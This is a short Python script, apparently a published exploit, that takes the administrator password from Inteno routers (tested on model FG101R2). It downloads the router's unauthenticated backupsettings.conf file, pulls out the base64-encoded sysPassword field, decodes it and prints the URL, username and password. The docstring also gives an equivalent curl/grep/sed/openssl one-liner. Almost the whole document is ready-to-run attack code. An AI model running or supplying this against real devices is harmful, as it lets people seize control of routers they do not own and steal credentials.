#!/usr/bin/env python

"""
Simple script for retrieving the admin password on Inteno routers.
Tested on FG101R2.

Equivalent bash oneliner:
    curl -s http://ip_addr/backupsettings.conf | \
            grep 'sysPassword' | \
            sed 's/^.*=\"\|\"\/>$//g' | \
            openssl enc -base64 -d
"""

import sys
from base64 import b64decode
from urllib2 import urlopen, URLError, HTTPError
from re import sub

def main():
    """Retrieve configuration and decode password"""

    if len(sys.argv) < 2:
        print 'usage: %s <ip address>' % sys.argv[0]
        sys.exit(1)

    ip_addr = sys.argv[1]

    filehandle = None
    url = 'http://%s/backupsettings.conf' % ip_addr
    try:
        filehandle = urlopen(url, timeout=10)
        content = filehandle.read()
        for line in content.split('\n'):
            if 'sysPassword' in line:
                b64_passwd = sub(r'^.*="|"/>$', '', line)
                print 'URL: http://%s\nUsername: admin\nPassword: %s' % \
                      (ip_addr, b64decode(b64_passwd))
                break
    except HTTPError as error:
        print 'failed to retrieve %s\n\t%s' % (url, error)
    except URLError as error:
        print 'failed to retrieve %s\n\t%s' % (url, error.reason)
    finally:
        if filehandle:
            filehandle.close()

if __name__ == '__main__':
    main()

